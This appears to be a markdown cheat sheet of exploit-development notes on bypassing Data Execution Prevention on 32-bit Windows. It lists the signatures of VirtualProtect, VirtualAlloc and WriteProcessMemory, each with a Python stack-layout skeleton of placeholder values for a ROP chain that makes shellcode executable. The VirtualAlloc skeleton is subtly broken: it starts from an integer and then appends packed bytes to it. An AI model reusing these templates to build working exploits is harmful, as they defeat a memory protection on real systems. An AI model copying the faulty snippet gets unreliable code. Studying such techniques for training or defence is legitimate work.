# Skeletons

---

### Table of Contents
- [Data Execution Prevention Bypass for 32bit](#data-execution-prevention-bypass-for-32bit)
  * [VirtualProtect](#virtualprotect)
  * [VirtualAlloc](#virtualalloc)
  * [WriteProcessMemory](#writeprocessmemory)

---

## Data Execution Prevention Bypass for 32bit
Data Execution Prevention (DEP) related stuff, with focus 32bit.

### VirtualProtect
- See [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)

```c
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

```python
vp = pack('<L', 0x41414141)   # VirtualProtect addy
vp += pack('<L', 0x42424242)  # shellcode return addy to return to, after VirtualProtect was called
vp += pack('<L', 0x43434343)  # lpAddress ---> same as above
vp += pack('<L', 0x44444444)  # dwSize ---> size of shellcode (0x400 or something like that)
vp += pack('<L', 0x45454545)  # flNewProtect ---> 0x40
vp += pack('<L', 0x46464646)  # lpflOldProtect ---> some writable memory address
```

### VirtualAlloc
- See [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

```c
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

```python
va = 0x41414141   # VirtualAlloc addy
va += pack('<L', 0x42424242)  # shellcode return addy to return to, after VirtualAlloc was called
va += pack('<L', 0x43434343)  # lpAddress ---> shellcode addy (same as above)
va += pack('<L', 0x44444444)  # dwSize ---> 0x1
va += pack('<L', 0x45454545)  # flAllocationType ---> 0x1000
va += pack('<L', 0x46464646)  # flProtect ---> 0x40
```

### WriteProcessMemory
- See [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

```python
wpm = pack('<L', 0x41414141)   # WriteProcessMemory addy
wpm += pack('<L', 0x42424242)   # shellcode return addy to return to, after WriteProcessMemory was called
wpm += pack('<L', 0xffffffff)   # hProcess ---> pseudo Process handle ---> -1
wpm += pack('<L', 0x44444444)   # lpBaseAddress ---> addy of code cave
wpm += pack('<L', 0x45454545)   # lpBuffer ---> shellcode addy
wpm += pack('<L', 0x46464646)   # nSize ---> shellcode size
wpm += pack('<L', 0x47474747)   # lpNumberOfBytesWritten ---> writable memory addy
```
